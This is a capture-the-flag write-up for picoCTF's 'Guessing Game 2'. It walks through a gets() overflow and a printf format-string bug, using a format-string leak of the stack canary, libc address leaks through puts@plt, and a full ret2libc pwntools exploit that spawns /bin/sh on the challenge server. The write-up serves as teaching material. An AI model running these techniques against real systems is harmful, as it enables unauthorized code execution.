# Guessing Game 2

## Source Code

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 512

long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);                           //  <- Buffer Overflow
	printf("Congrats: ");
	printf(winner);                         //  <- Format String vuln
	printf("\n\n");
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

## Overview & Idea

- Let's check the infomations of binary

![img](/picoCTF/guessing_game_2/assets/bin_info.png)

- With this challenge, I take advantage of brute-force script and format string to bypass some condition code and stack protection, after bypassed, I have just found which libc that server used, then the challenge return back to ret2libc.

## Detail

- The get_random() of this program is so weird. It's not random, it's specific value because rand is address of rand function (here is address in libc) and in assembly code, it just do a bunch of opcode and return the final value. I think rand is internal function of binary (binary has no PIE), because if it's located in libc, it will be randomized because ASLR protector.

- This address can be changed each time we run the program, but it's take a period of time, I don't know how does it work but hmm, it's so weird... :v. 

- Ok, We know that the get_random() return the fixed value. We can bypass the do_stuff to get through to win function by brute-force with python script and I found it is -3727.

```python
from pwn import *

for payload in range(-4095, 4097):
    #  elf = ELF("./vuln")
    #  p = elf.process()
    log.info(str(payload).encode('ascii'))
    p = remote("jupiter.challenges.picoctf.org", 13610)
    p.recvuntil("What number would you like to guess?\n")
    p.sendline(str(-3727).encode("ascii"))
    p.recvuntil("Name? ")
    p.sendline(b"damn")
    p.recvuntil("What number would you like to guess?\n")
    p.sendline(str(payload).encode('utf-8'))

    s = p.recvline()
    if ("Congrats!" in s):
        break
    p.close()
print(payload)
p.interactive()
```

- After bypassed the do_stuff, we can ignore it to exploit win function.

- Stack frame of win function has protected by canary, it just a 4 bytes value in 32-bit located on stack and it is used to check whether the return of the function is overwritten with BOF, if ret of the function is overwritten by BOF, canary will be changed because we must overwrite the canary before reach to the ret. Before program returns to next instruction of called function, it will check the canary whether is it changed? if it is changed, then the program return with signal that stack was smashed, if not the program just normally continue implement the code.

- Here is disassembly code of vuln, we can see that the program has 

![img](/picoCTF/guessing_game_2/assets/stack_canary.png)

- But below BOF code, the program also has format string vuln. We can take advantage of this vuln to leak the canary value and add it into payload, then we can bypass the canary protection with value that we leaked because the canary value does not change during the runtime of program.

- We can use some format that I have written in protostar write-up

- First, I use a bunch of %p to read all the stack and specify the index of canary

```
λ /mnt/c/users/whatd/Desktop/CTF/pwn/picoCTF/guessing_game_2/ ./vuln
Welcome to my guessing game!
Version: 2

What number would you like to guess?
-1727                                                         # <- -1727 is my local value to bypass do_stuff
Congrats! You win! Your prize is this print statement!

New winner!
Name? AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Congrats: AAAA.0x200.0xf7ed6580.0x804877d.0x1.0xfffff941.0xfffff941.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.(nil).0xf7d63b79.0xf7ed49e0.0xf7ed6d20.0x1c.0xffa24ec8.0xc18fc300.0xf7ed6d20.0xa.0x1c.0x8049fbc.0x1.0x8048520.0xffa24ef8.0xf7d3bf35.(nil).0x80489fc.0xffa24ed4.(nil).0x1.0x8048520.0xf7d3bf15.0xc18fc300.0x80489fc.0x8049fbc.0xffa24ef8.0x804888c.0x1
```

- After entered input, I check the stack and canary

![img](/picoCTF/guessing_game_2/assets/stack_check.png)

```
pwndbg> x/200xw $esp
0xffffd1c0:     0x080489d2      0x00000200      0xf7faf580      0x0804877d
                                                              +------------+
0xffffd1d0:     0x00000001      0xfffff941      0xfffff941    | 0x41414141 |  <- 0xffffd1df is start of winner
                                                              +------------+
0xffffd1e0:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd1f0:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd200:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd210:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd220:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd230:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd240:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd250:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd260:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd270:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd280:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd290:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd2a0:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd2b0:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd2c0:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd2d0:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd2e0:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd2f0:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd300:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd310:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd320:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd330:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd340:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd350:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
0xffffd360:     0x2e70252e      0x252e7025      0x70252e70      0x2e70252e
0xffffd370:     0x252e7025      0x70252e70      0x2e70252e      0x252e7025
0xffffd380:     0x70252e70      0x00000000      0xf7e3cb79      0xf7fad9e0
0xffffd390:     0xf7fafd20      0x0000001c      0xffffd3d8      0x1ce96a00
0xffffd3a0:     0xf7fafd20      0x0000000a      0x0000001c      0x08049fbc
0xffffd3b0:     0x00000001      0x08048520      0xffffd408      0xf7e14f35
0xffffd3c0:     0x00000000      0x080489fc      0xffffd3e4      0x00000000
                                                              +------------+
0xffffd3d0:     0x00000001      0x08048520      0xf7e14f15    | 0x1ce96a00 |    <- 0xffffd3df is canary value of win
                                                              +------------+
                                                              +------------+
0xffffd3e0:     0x080489fc      0x08049fbc      0xffffd408    | 0x0804888c |    <- 0xffffd3ec is ret of win
															  +------------+
0xffffd3f0:     0x00000001      0xffffd4c4      0x000003e8      0x00000001
0xffffd400:     0xffffd420      0x00000000      0x00000000      0xf7ddf905
0xffffd410:     0x00000001      0x08048520      0x00000000      0xf7ddf905
0xffffd420:     0x00000001      0xffffd4c4      0xffffd4cc      0xffffd454
0xffffd430:     0x00000000      0x00000000      0xf7fe7279      0xf7faeff4
0xffffd440:     0xf7fcb924      0xf7ffcff4      0xffffd4a8      0x00000000
0xffffd450:     0xf7ffd9d0      0x00000000      0x00000001      0x08048520
0xffffd460:     0x00000000      0x6a4c3085      0x2e150c95      0x00000000
0xffffd470:     0x00000000      0x00000000      0x00000000      0xf7ffcff4
0xffffd480:     0x00000000      0x00000000      0x00000000      0x08049fbc
0xffffd490:     0x00000001      0x08048520      0x00000000      0x08048552
0xffffd4a0:     0x080487ff      0x00000001      0xffffd4c4      0x080488a0
0xffffd4b0:     0x08048900      0xf7fdc4f0      0xffffd4bc      0xf7ffd9d0
0xffffd4c0:     0x00000001      0xffffd61e      0x00000000      0xffffd65e
0xffffd4d0:     0xffffd66e      0xffffd67f      0xffffdc69      0xffffdc7d
```

- By some simple python script, I found canary has index 119, so we can use `"%119$p"` instead of bunch of `"%p"`. Here is script that leak the canary

```python
p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline("%119$p")
p.recvuntil("Congrats: ")
canary = int(p.recv(10), 16)
log.info(hex(canary))
```

![img](/picoCTF/guessing_game_2/assets/disass_main.png)


- We can calculate the padding_1 from start of winner string is `0xffffd3df - 0xffffd1df = 512 bytes` and padding_2 between canary and ret is `12 bytes`

- Then I need to leak the 2 funtions in libc using puts@plt and address puts@got.plt of each function ,then specify which libc the server used by use libc database [https://libc.rip/](https://libc.rip/).

```
pwndbg> disass 'puts@plt'
Dump of assembler code for function puts@plt:
   0x080484c0 <+0>:     jmp    DWORD PTR ds:0x8049fdc
   0x080484c6 <+6>:     push   0x28
   0x080484cb <+11>:    jmp    0x8048460
End of assembler dump.
pwndbg> disass 'printf@plt'
Dump of assembler code for function printf@plt:
   0x08048470 <+0>:     jmp    DWORD PTR ds:0x8049fc8
   0x08048476 <+6>:     push   0x0
   0x0804847b <+11>:    jmp    0x8048460
End of assembler dump.
```

```python
bypass_rand = -3727
win_addr = 0x0804876e
puts_plt = 0x80484c0
puts_got_plt = 0x8049fdc
printf_got_plt = 0x8049fc8
```

- We use the technique that I have write it in Dynamic ROP bi0s, passing parameter to puts on stack and ret to puts_plt instead of ret to next instruction in main, then we ret to win and do the same with printf.

```python
payload_1 = "a"*512
payload_1 += p32(canary)
payload_1 += "a"*12
payload_1 += p32(puts_plt)
payload_1 += p32(win_addr)
payload_1 += p32(puts_got_plt)
p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline(payload_1)
s = p.recvline()
s = p.recvline()
s = p.recv(4)
```

- After do that, we leaked the address of puts and printf in libc, and we have to do something to handle the received data. Which I choose for loop and move byte by byte to leak variable

```
puts_libc = 0
count = 0
for i in s:
    puts_libc += ord(i) << count
    count += 8
log.info(hex(puts_libc))
```

- And we use the same script with printf address leaking.

```python
payload_2 = "a"*512
payload_2 += p32(canary)
payload_2 += "a"*12
payload_2 += p32(puts_plt)
payload_2 += p32(win_addr)
payload_2 += p32(printf_got_plt)
p.recvuntil("Name? ")
p.sendline(payload_2)
s = p.recvline()
s = p.recvline()
s = p.recv(4)
printf_libc = 0
count = 0
for i in s:
    printf_libc += ord(i) << count
    count += 8
log.info(hex(printf_libc))
```

- you can refer the complete script that I use for finding libc in below

```python

# filename: libc_leak.py
from pwn import *

host = "jupiter.challenges.picoctf.org"
port = 13610
p = remote(host, port)

bypass_rand = -3727
win_addr = 0x0804876e
puts_plt = 0x80484c0
puts_got_plt = 0x8049fdc
printf_got_plt = 0x8049fc8

p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline("%119$p")
p.recvuntil("Congrats: ")
canary = int(p.recv(10), 16)
log.info(hex(canary))

payload_1 = "a"*512
payload_1 += p32(canary)
payload_1 += "a"*12
payload_1 += p32(puts_plt)
payload_1 += p32(win_addr)
payload_1 += p32(puts_got_plt)
p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline(payload_1)
s = p.recvline()
s = p.recvline()
s = p.recv(4)
puts_libc = 0
count = 0

for i in s:
    puts_libc += ord(i) << count
    count += 8
log.info(hex(puts_libc))

payload_2 = "a"*512
payload_2 += p32(canary)
payload_2 += "a"*12
payload_2 += p32(puts_plt)
payload_2 += p32(win_addr)
payload_2 += p32(printf_got_plt)
p.recvuntil("Name? ")
p.sendline(payload_2)
s = p.recvline()
s = p.recvline()
s = p.recv(4)
printf_libc = 0
count = 0
for i in s:
    printf_libc += ord(i) << count
    count += 8
log.info(hex(printf_libc))

p.interactive()
```

![img](/picoCTF/guessing_game_2/assets/libc_leak.png)

- After leaked 2 funtions address, I use [https://libc.rip/](https://libc.rip/) libc database to find which libc that server used. I need 2 funtions because I find 2 more libc available, so, to specify what is the right libc, I need to check the offset between printf and puts in each libc, if it is the right libc, the offset between 2 functions puts and printf is equal with offset that we have leaked.

![img](/picoCTF/guessing_game_2/assets/libc_finding.png)
![img](/picoCTF/guessing_game_2/assets/found_libc.png)


- Then the challenge return to ret2libc :3, I found offset of system function puts function and "/bin/sh" string address, then send final exp.py file to get shell.

## Exploit

```python
# filename: exp.py
from pwn import *

host = "jupiter.challenges.picoctf.org"
port = 13610
p = remote(host, port)

bypass_rand = -3727
win_addr = 0x0804876e
puts_plt = 0x80484c0
puts_got_plt = 0x8049fdc
printf_got_plt = 0x8049fc8

p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline("%119$p")
p.recvuntil("Congrats: ")
canary = int(p.recv(10), 16)
log.info(hex(canary))

payload_1 = "a"*512
payload_1 += p32(canary)
payload_1 += "a"*12
payload_1 += p32(puts_plt)
payload_1 += p32(win_addr)
payload_1 += p32(puts_got_plt)
p.recvuntil("What number would you like to guess?\n")
p.sendline(str(bypass_rand).encode("ascii"))
p.recvuntil("Name? ")
p.sendline(payload_1)
s = p.recvline()
s = p.recvline()
s = p.recv(4)
puts_libc = 0
count = 0

for i in s:
    puts_libc += ord(i) << count
    count += 8
log.info(hex(puts_libc))

puts_offset = 0x00067560
sys_offset = 0x0003cf10
binsh_offset = 0x17b9db

base_addr = puts_libc - puts_offset
puts_real = base_addr + puts_offset
sys_real = base_addr + sys_offset
binsh_real = base_addr + binsh_offset

payload_2 = "a"*512
payload_2 += p32(canary)
payload_2 += "a"*12
payload_2 += p32(sys_real)
payload_2 += "aaaa" 
payload_2 += p32(binsh_real)
p.recvuntil("Name? ")
p.sendline(payload_2)

p.interactive()
```

## Result

![img](/picoCTF/guessing_game_2/assets/get_shell.png)

